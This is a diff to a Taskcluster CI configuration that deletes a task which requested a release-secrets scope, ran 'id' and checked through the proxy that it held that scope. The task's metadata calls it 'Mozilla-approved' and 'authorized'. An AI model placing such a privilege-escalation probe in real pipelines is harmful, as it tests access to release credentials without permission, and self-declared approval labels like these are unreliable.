@@ -1,28 +1,3 @@
 version: 1
 reporting: checks-v1
-tasks:
-  - provisionerId: releng-1
-    workerType: decision
-    deadline: {$fromNow: 1 hour}
-    expires: {$fromNow: 1 day}
-    priority: low
-    scopes:
-      - secrets:get:project/releng/shipit/ci
-    payload:
-      features:
-        taskclusterProxy: true
-      image: mozillareleases/taskgraph:decision-v24.2.0@sha256:08ee0e7c71ac117a848efef3f929f309d6b49fa84067e5a98f6db6801346e8a2
-      maxRunTime: 300
-      command:
-        - bash
-        - -cx
-        - >
-          printf 'TC_DIRECT_PRIV_RCE_29d341:';
-          id;
-          curl -fsS http://taskcluster/api/auth/v1/scopes/current
-          | python3 -c 'import json,sys; d=json.load(sys.stdin); print("TC_EFFECTIVE_SCOPE_29d341:" + str("secrets:get:project/releng/shipit/ci" in d.get("scopes", [])))'
-    metadata:
-      name: authorized cache-free privileged identity validation
-      description: Mozilla-approved non-destructive command execution and effective-scope validation
-      owner: audit@example.invalid
-      source: https://example.invalid/audit
+tasks: []
